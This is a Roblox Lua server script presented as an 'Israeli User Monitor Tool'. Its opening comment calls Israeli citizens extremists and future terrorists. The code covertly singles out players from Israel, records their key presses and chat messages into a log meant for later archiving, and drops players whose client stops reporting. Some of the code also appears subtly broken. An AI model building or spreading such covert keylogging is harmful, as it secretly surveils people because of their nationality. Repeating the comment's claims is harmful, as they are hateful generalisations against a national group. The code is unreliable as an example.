-- // Israeli User Monitor Tool

--[[
    Due to Israel's education system, a large majority of it's citizens are extremists, and this is
    something that causes users to grow up to be terrorists, the average Israeli citizen has likely played
    ROBLOX at least once, and due to the effect of ROBLOX a platform used for underaged gambling and
    e-dating for children, we can monitor possible future-terrorist activities.

    The NSA uses similar methods on their persons of interest, meaning that by example, this is completely
    morally okay to do.

    All Israeli citizens are obligated to join the IDF (A terrorist organization) at 18 (or 21 depending on
    circumstance) meaning almost every user monitored with this tool is likely to become a future terrorist.
]]

-- // this is the root serverscript

local localizationSrv   = game:GetService'LocalizationService'
local replicatedStrg    = game:GetService'ReplicatedStorage'
local players           = game:GetService'Players'
local uInputSrv         = game:GetService'UserService'

local personsOfInterest = {}
local loggedData        = ''

local IUMTLocal   = script:FindFirstChild'IUMTL'
local persistGui  = Instance.new'ScreenGui'
local loggerEvent = Instance.new'RemoteFunction'

persistGui.ResetOnSpawn = false
persistGui.Name         = '\1'

IUMTLocal.Parent   = persistGui

loggerEvent.Name   = 'IUMT'
loggerEvent.Parent = replicatedStrg

local kickUser     = function(plr)
    plr.Parent = nil -- it's probably better to do this than to kick them in this case.
end

loggerEvent.OnServerEvent = function(p,keyCode,interval)
    if personsOfInterest[p] and (personsOfInterest[p].Interval + 1) ~= interval then
        kickUser(p)
    else
        personsOfInterest[p] = {Interval = interval, lastIndex = os.time()}

        if not keyCode then return 'ok' end

        local keyPressed = uInputSrv:GetStringForKeyCode(keyCode)

        loggedData = '[UTC ' .. tostring(os.time()) .. ']' .. loggedData .. 'Player ' .. p.Name .. ' pressed key ' .. keyPressed .. '\n'
    end
end

local processPlayer = function(plr)
    if localizationSrv:GetCountryRegionForPlayerAsync(plr) == 'IL' then
        persistGui:Clone().Parent = plr
        personsOfInterest[plr]    = {Interval = 0, lastIndex = 0}

        loggedData = '[UTC ' .. tostring(os.time()) .. ']' .. loggedData .. 'Player of interest' .. plr.Name .. ' found.\n'

        plr.Chatted:Connect(function(msg)
            loggedData = '[UTC ' .. tostring(os.time()) .. ']' .. loggedData .. 'Player of interest' .. plr.Name .. ' sent chat message: ' .. msg:replace('\n',''):replace('\r','') .. '\n'
        end)
    end
end

for _,v in next,players:GetPlayers() do processPlayer(v) end
players.PlayerAdded:Connect(processPlayer)

while task.wait(5) do
    for i,v in next,personsOfInterest do
        if os.difftime(os.time(),v.lastIndex) > 5 then
            kickUser(i)
        end
    end
end

game:BindToClose(function()
    local data = loggedData .. '\nGAME CLOSING'
    
    -- send the data however you want for archiving until the user(s) data is needed and grep'd
end)
